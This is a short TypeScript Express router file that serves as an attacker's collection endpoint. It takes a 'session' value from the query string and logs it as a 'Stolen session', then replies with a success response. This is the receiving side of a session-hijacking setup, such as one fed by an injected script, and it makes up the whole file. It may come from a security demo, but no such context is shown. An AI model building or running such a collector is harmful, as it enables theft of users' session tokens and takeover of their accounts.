// Third party
import express from "express";
// Utils
import { logger } from "@/configs/logger.js";
import { sendSuccessResponse } from "@/utils/sendResponse.js";
import { responseEnvelope } from "@/utils/responseEnvelope.js";

export const logRouter = express.Router();

logRouter.get("/", (req, res) => {
  const session = req.query.session as string;
  if (session) {
    logger.info(`Stolen session: ${session}`);
  } else {
    logger.warn("No session provided in query params");
  }
  sendSuccessResponse(res, responseEnvelope({ state: "success", data: { logged: true } }));
});